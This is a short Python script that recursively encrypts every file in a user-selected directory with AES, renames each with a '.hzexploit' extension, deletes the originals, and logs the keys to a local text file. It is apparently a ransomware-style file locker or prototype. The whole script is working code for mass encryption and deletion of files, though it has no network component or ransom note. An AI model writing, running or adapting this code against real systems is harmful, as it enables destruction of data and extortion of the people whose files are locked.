from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import filedialog
import os

def save_key_and_info(key, nonce, file_name, output_info_file):
    try:
        file_extension = os.path.splitext(file_name)[1]  # Get the file extension
        file_name_only = os.path.basename(file_name)  # Get the original file name
        with open(output_info_file, 'a') as f:  # Append to the info file
            f.write(f"File Encrypted: {file_name}\n")
            f.write(f"Original File Name: {file_name_only}\n")  # Save original file name
            f.write(f"Key: {key.hex()}\n")  # Save key as a hexadecimal string
            f.write(f"Nonce: {nonce.hex()}\n")  # Save nonce as a hexadecimal string
            f.write(f"Extension: {file_extension}\n")  # Save the original file extension
            f.write("\n")
        print(f"Key and information for {file_name} successfully saved to {output_info_file}")
    except Exception as e:
        print(f"Failed to save key and information: {e}")

def encrypt_file(input_file, output_file, output_info_file):
    key = get_random_bytes(16)  # Generate a 16-byte key
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    with open(output_file, 'wb') as f:
        f.write(nonce + tag + ciphertext)
    
    # Save key and info to text file
    save_key_and_info(key, nonce, input_file, output_info_file)
    
    print(f"Encrypted file saved to {output_file}")

    # Remove the original file
    try:
        os.remove(input_file)
        print(f"Original file {input_file} has been deleted.")
    except Exception as e:
        print(f"Failed to delete original file: {e}")

def encrypt_all_files_in_directory(directory):
    output_info_file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")], title="Save Encryption Info File")
    if not output_info_file:
        print("No save location selected for info file.")
        return
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            input_file = os.path.join(root, file)
            output_file = input_file + ".hzexploit"  # Add .hzexploit extension
            encrypt_file(input_file, output_file, output_info_file)

def choose_directory_to_encrypt():
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    
    directory = filedialog.askdirectory(title="Select Directory to Encrypt")
    if not directory:
        print("No directory selected.")
        return
    
    encrypt_all_files_in_directory(directory)

if __name__ == "__main__":
    choose_directory_to_encrypt()
